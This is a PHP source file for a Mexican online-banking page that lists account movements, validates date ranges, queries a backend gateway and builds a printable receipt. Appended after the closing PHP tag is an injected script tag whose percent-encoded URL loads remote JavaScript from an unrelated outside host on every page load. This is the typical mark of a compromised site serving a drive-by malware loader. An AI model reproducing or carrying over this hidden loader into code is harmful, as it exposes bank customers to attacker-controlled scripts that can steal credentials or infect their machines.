<?php
//
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright ( C ) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or ( at your option ) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//
include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );

$session =& eZSession::globalSession( );

if( !$session->fetch( ) )
	$session->store( );

$ini =& $GLOBALS[ "GlobalSiteIni" ];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

include_once( "ezuserbb/classes/ezuser.php" );

$user =& eZUserBB::currentUser( );

// DebugBreak( );

//REF WMA-12sep2008, Fin
function ultimoDia( $mes, $anio )
{
	$ultimo_dia = 28;
	while (checkdate ($mes, $ultimo_dia, $anio) )
	{
		$ultimo_dia ++;
	}
	return ($ultimo_dia-1);
}
//REF WMA-12sep2008, Fin
//REF WMA-25jul2008, Inicio
function formatPage ( $HTML )
{

		$HTML = str_replace("<INPUT TYPE=\"BUTTON\" NAME=\"Button2\" VALUE=\"Regresar\" LANGUAGE=\"JavaScript\" ONCLICK=\"parent.history.back()\"><INPUT TYPE=\"SUBMIT\" NAME=\"Button\" VALUE=\"Ver más\" LANGUAGE=\"JavaScript\"><INPUT TYPE=\"BUTTON\" NAME=\"ButtonImprimir\" VALUE=\"Imprimir\" LANGUAGE=\"JavaScript\" ONCLICK=\"ventana()\">","",$HTML);
		$HTML = str_replace("<INPUT TYPE=\"BUTTON\" NAME=\"Button2\" VALUE=\"Regresar\" LANGUAGE=\"JavaScript\" ONCLICK=\"parent.history.back()\"><INPUT TYPE=\"BUTTON\" NAME=\"ButtonImprimir\" VALUE=\"Imprimir\" LANGUAGE=\"JavaScript\" ONCLICK=\"ventana()\">","", $HTML);
		//$HTML = ereg_replace("<INPUT TYPE\=\"SUBMIT\" NAME=\"Button\" VALUE=\"Ver más\" LANGUAGE=\"JavaScript\"> ([^>]+)","", $HTML );
		//$HTML = ereg_replace("","", $HTML );

		return ( $HTML );
}
//REF WMA-25Jul2008, Fin

if ( $user )
{
	$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ), "eztransaccion/user/intl/", $Language, "movimientos.php" );
	$t->setAllStrings( );
	$t->set_file( array( "movimientos_tpl" => "movimientos.tpl" ) );
	$session =& eZSession::globalSession( );
	if ( !$session->fetch( ) )
	{
		$session->store( );
	}
	$tr = new eZTransaccion( );
	$usr = $session->variable( "r_usr" );
	$qki = $session->variable( "r_qki" );
	$priv = $session->variable( "r_priv" );
	$transaccion_buffer = "";
//HB
	if(!empty($_POST['Access']))
        $Access = $_POST['Access'];
        
   if(!empty($_POST['Day']))
        $Day = $_POST['Day'];
        
   if(!empty($_POST['DayF']))
        $Day = $_POST['DayF'];
        
   if(!empty($_POST['FrAccount']))
        $FrAccount = $_POST['FrAccount'];
        
   if(!empty($_POST['Month']))
        $Month = $_POST['Month'];
        
	if(!empty($_POST['Year']))
        $Year = $_POST['Year'];        
        
   if(!empty($_POST['MonthF']))
        $MonthF = $_POST['MonthF'];
        
	if(!empty($_POST['YearF']))
        $YearF = $_POST['YearF'];
        
   if(!empty($_POST['FrAmount']))
        $FrAmount = $_POST['FrAmount'];
        
   if(!empty($_POST['top']))
        $top = $_POST['top'];
        
   if(!empty($_POST['Accion']))
        $Accion = $_POST['Accion'];
        
   if(!empty($_POST['Pos']))
        $Pos = $_POST['Pos'];
        
   if(!empty($_POST['Dias']))
        $Dias = $_POST['Dias'];
        
   if(!empty($_POST['FrNo']))
        $FrNo = $_POST['FrNo'];     
//HB
	if( empty( $Access ) )
	{
		$Access = "FrAc";
	}
	// $Accion = "movimientos";
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $Day ) )
	{
		$Day = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $FrAccount ) )
	{
		$FrAccount = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $Month ) )
	{
		$Month = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $Year ) )
	{
		$Year = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $FrAmount ) )
	{
		$FrAmount = "";
	}
	if( !isset /*(HB AGL - Ajustes PHP5)*/( $top ) )
	{
		$top = "";
	}
	switch( $Access )
	{
		case "FrAc":
//			$particularFields = "";
			$tr->blog( $qki,"Movimientos", $FrAccount, $Day, $Month, $Year, $Accion );
			break;
		case "Confirm":
		case "Process":
			//LVPR Movtos x JBoss 10Oct2007
			$MenosFin = 2;	//Es para Ov
			if ( in_array( "hst", ( preg_split( "/[,||(,\s)]+/", $ini->read_var( "site", "JBossTransactions" ) ) ) ) )
			{
				$MenosFin = 1;		//Para JBoss
			}
			//LVPR Movtos x JBoss 10Oct2007
			switch( substr( $FrAccount, strlen( $FrAccount )-1, 1 ) )
			{
				case "D":
					$m_s = "<h4 align=right>Cuenta de Vista: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				case "T":
					$m_s = "<h4 align=right>Cuenta de Plazo: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
				case "L":
					$m_s = "<h4 align=right>Cuenta de Cr&eacute;dito: ".substr( $FrAccount, 0, strlen( $FrAccount )-$MenosFin )."</h4>";
					break;
			}
		//REF WMA-12sep2009, Inicio
			if (trim($_POST['DayF']) == "" and trim($_POST['MonthF']) != "" and trim($_POST['YearF']) != "")
			{
				$DayF = ultimoDia(trim($_POST['MonthF']), trim($_POST['YearF']));
			}

			if (trim($_POST['Day']) != "" and trim($_POST['Month']) == "" and trim($_POST['Year']) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
				$t->set_var( "transaccion_buffer", $transaccion_buffer );
				$t->pparse( "output", "movimientos_tpl" );
				return;
			}

			if (trim($_POST['Day']) == "" and trim($_POST['Month']) != "" and trim($_POST['Year']) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
				$t->set_var( "transaccion_buffer", $transaccion_buffer );
				$t->pparse( "output", "movimientos_tpl" );
				return;
			}
			if (trim($_POST['Day']) == "" and trim($_POST['Month']) == "" and trim($_POST['Year']) != "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
				$t->set_var( "transaccion_buffer", $transaccion_buffer );
				$t->pparse( "output", "movimientos_tpl" );
				return;
			}

			if (trim($_POST['DayF']) != "" and trim($_POST['MonthF']) == "" and trim($_POST['YearF']) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
				$t->set_var( "transaccion_buffer", $transaccion_buffer );
				$t->pparse( "output", "movimientos_tpl" );
				return;
			}

			if (trim($_POST['DayF']) == "" and trim($_POST['MonthF']) != "" and trim($_POST['YearF']) == "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
				$t->set_var( "transaccion_buffer", $transaccion_buffer );
				$t->pparse( "output", "movimientos_tpl" );
				return;
			}
			if (trim($_POST['DayF']) == "" and trim($_POST['MonthF']) == "" and trim($_POST['YearF']) != "")
			{
				$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
				$t->set_var( "transaccion_buffer", $transaccion_buffer );
				$t->pparse( "output", "movimientos_tpl" );
				return;
			}
		//REF WMA-12sep2009, Fin
		//REF WMA-13aug2008, Inicio. Nueva validación para día bien formado
			if (trim($_POST['Day']) != "" and trim($_POST['Month']) != "" and trim($_POST['Year']) != "")
			{
				if (!(checkdate(trim($_POST['Month']),trim($_POST['Day']),trim($_POST['Year']))))
				{
					$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha inicial es inv&aacute;lida</b>";
					$t->set_var( "transaccion_buffer", $transaccion_buffer );
					$t->pparse( "output", "movimientos_tpl" );
					return;
				}
			}

			if (trim($_POST['DayF']) != "" and trim($_POST['MonthF']) != "" and trim($_POST['YearF']) != "")
			{
				if (!(checkdate(trim($_POST['MonthF']),trim($_POST['DayF']),trim($_POST['YearF']))))
				{
					$transaccion_buffer = "Transacci&oacute;n no realizada.<br><br><b>La fecha final es inv&aacute;lida</b>";
					$t->set_var( "transaccion_buffer", $transaccion_buffer );
					$t->pparse( "output", "movimientos_tpl" );
					return;
				}
			}
		//REF WMA-13aug2008, Fin
			$particularFields = "&FrAccount=".urlencode( $FrAccount )."&Accion=".urlencode( $Accion )."&Day=".urlencode( $Day )."&Month=".urlencode( $Month )."&Year=".urlencode( $Year )."&DayF=".urlencode( $DayF )."&MonthF=".urlencode( $MonthF )."&YearF=".urlencode( $YearF )."&Pos=".urlencode( $Pos )."&FrAmount=".urlencode( $FrAmount )."&Dias=".urlencode( $Dias )."&FrNo=".urlencode( $FrNo )."&top=".urlencode( $top );
			$tr->blog( $qki,"Movimientos", $FrAccount, $Day, $Month, $Year, $Accion );
			break;
	}
	$transaccion_buffer = "";
	$transaccion_buffer .= $m_s;
	// DebugBreak( );
	$ret_code = $tr->PostToHost( $backend, "/IBnkIIS.dll", "Trxn=hst&Access=".urlencode( $Access )."&CustID=".urlencode( $usr )."&Cadpriv=".urlencode( $priv ).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer ); // movimientos
	// WMA-25Jul2008, Inicio Generacion de comprobantes
	if ($Access == "Process")
	{
		$ini =& INIFile::globalINI();
		$SecureServer = $ini->read_var( "site", "SecureServer" );
		$SecureServerType = $ini->read_var( "site", "SecureServerType" );
		$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );
		$ServerNumber = $ini->read_var( "site", "ServerNumber" );

		$buffer2 = formatPage($transaccion_buffer);

		$buffer2 = str_replace(chr(34),chr(92).chr(34),$buffer2);	//coloco \ antes del "

		$buffer2 = str_replace("<FONT COLOR=".chr(92).chr(34)."WHITE".chr(92).chr(34).">","<FONT COLOR=".chr(92).chr(34)."BLACK".chr(92).chr(34)."><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para encabezados. Ademas alineacion superior
		$buffer2 = str_replace("<TD BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34).">","<TD BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para Fecha, Descripcion

		$buffer2 = str_replace("<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."RIGHT".chr(92).chr(34)." >","<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."LEFT".chr(92).chr(34)." VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para monto. Ademas alineacion superior
		$buffer2 = str_replace("<TD BGCOLOR=".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN=".chr(92).chr(34)."RIGHT".chr(92).chr(34).">","<TD   BGCOLOR = ".chr(92).chr(34)."#DDDDDD".chr(92).chr(34)." ALIGN = ".chr(92).chr(34)."RIGHT".chr(92).chr(34)." VALIGN='TOP'><span style='font-size:11px;font-family:Arial'>", $buffer2); //fuente Arial-8 para saldo. Ademas alineacion superior

		$buffer2 = str_replace("<BR/>","", $buffer2);
		//$buffer2 = str_replace("<h4 align=right>","<h4 align=right><span style='font-size:13px;font-family:Arial'>", $buffer2); //achica letra al cliente tipo y sub
		$buffer2 = str_replace("<FONT COLOR=WHITE>*No Aplica</FONT>","<span style='font-size:11px;font-family:Arial'><FONT COLOR=BLACK>*No Aplica</FONT>", $buffer2); //modifico a Arial-8 la leyenda *No Aplica
		$posIni  = strpos($buffer2, "<h4 align=right>") + 16;
		$posFin  = strpos($buffer2, "</h4>");
		$cuenta  = substr($buffer2, $posIni, $posFin-$posIni);
		$buffer2 = str_replace($cuenta, "", $buffer2);
		$Pagina = "<SCRIPT LANGUAGE='JavaScript'> function ventana() { var windowW = 800; var windowH = 450; var windowX = 10; var windowY = 10; var title = 'Recibo'; s = 'width='+windowW+',height='+windowH; cadena=\"<HTML><HEAD><link REL='STYLESHEET' HREF='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/recibos.css' TYPE='text/css'><TITLE>Impresión de Movimientos</TITLE>";
		$Pagina = $Pagina."<SCRIPT LANGUAGE='JavaScript'> function window_onbeforeprint() { Imprimir.style.visibility = 'hidden'; Salir.style.visibility = 'hidden';} function window_onafterprint() { Imprimir.style.visibility = 'visible'; Salir.style.";
		$Pagina = $Pagina."visibility = 'visible'; }\"+\"<\"+\"/\"+\"SCRIPT></HEAD><BODY LANGUAGE='javascript' onbeforeprint='return window_onbeforeprint()' onafterprint='return window_onafterprint()'>";
		$Pagina = $Pagina."<INPUT type='button' value='Imprimir' id=Imprimir name=Imprimir onclick='window.print();'>&nbsp;<INPUT type='button' value=' Salir  ' id=Salir name=Salir onclick='window.close();'>";
		//$Pagina = $Pagina."<BR>";	//se comenta para tener más espacio
		$Pagina = $Pagina."<P><CENTER>";
		$Pagina = $Pagina."<IMG SRC='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/LOGO_BB.GIF' WIDTH=100 HEIGHT=50 ALIGN= 'TOP' Banco del Bajio>";
		$Pagina = $Pagina."</P></CENTER>";
		$Pagina = $Pagina."<H2><span style='font-size:13px;font-family:Arial;'>Impresión de Movimientos - ".$cuenta."</H2>";
		//$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />"; //se comenta para tener más espacio
		//$Pagina = $Pagina."<hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<P ALIGN='RIGHT'><B><FONT>$date $time</FONT></B></P>";
		$Pagina = $Pagina.$buffer2;
		//$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />"; //se comenta para tener más espacio
		$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<p><FONT SIZE=1>Av. Manuel J. Clouthier No. 508 Col. Jardines del Campestre CP 37128 León, Gto.</FONT> </p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>Consultas y aclaraciones 01 (477) 710- 4600 o al 01 (800) 471-0400</FONT></p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>EL ÚNICO COMPROBANTE OFICIAL DE ESTA TRANSACCIÓN ES EL ESTADO DE CUENTA QUE EMITE BANCO DEL BAJIO.</FONT></p>";
		$Pagina = $Pagina."</BODY></HTML>\"; NFW =";
		$Pagina = $Pagina." window.open(\"\",'Recibo',\"toolbar=no,menubar=no,scrollbars=2,\"+s); NFW.blur(); NFW.resizeTo(windowW,windowH); NFW.moveTo(windowX,windowY); NFW.";
		$Pagina = $Pagina."document.open(); NFW.document.write(cadena); NFW.document.close(); NFW.window.focus(); } </SCRIPT>";
		$t->set_var( "transaccion_buffer", $Pagina.$transaccion_buffer );
	}
	else
	{
		$t->set_var( "transaccion_buffer", $transaccion_buffer );
	}
	// WMA-25Jul2008, Fin Generacion de comprobantes
	$t->pparse( "output", "movimientos_tpl" );
}
else
{
	$t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ), "eztransaccion/user/intl/", $Language, "userlogin.php" );
	$t->setAllStrings( );
	$t->set_file( array ( "user_login_tpl" => "userlogin.tpl" ) );
	$t->set_var( "redirect_url", "/transaccion/movimientos/" );
	$t->pparse( "output", "user_login_tpl" );
}
?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>